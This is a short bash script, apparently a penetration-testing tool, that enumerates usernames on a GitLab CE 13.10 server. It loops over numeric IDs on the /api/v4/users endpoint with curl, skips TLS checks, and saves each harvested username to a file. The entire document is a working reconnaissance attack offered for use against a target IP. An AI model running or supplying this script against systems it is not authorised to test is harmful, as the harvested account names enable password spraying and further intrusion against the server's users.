#!/bin/bash
# Tested on GitLab CE 13.10 version
# Give the IP and the maximum number of users to be tested
# Example: ./gitlab-enumerator.sh 10.10.10.10 500

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP> <NUM-USERS>"
    exit 1
fi

IP=$1
NUMBER=$2
API_PATH="api/v4/users"

for ((i=0; i<=NUMBER; i++)); do
    URL="https://$IP/$API_PATH/$i"
    RESPONSE=$(curl -s -k $URL | grep "{" | jq -r '.username?' | tee -a username-found-on-$IP.txt)

    echo "User ID $i: $RESPONSE"
    sleep 1
done
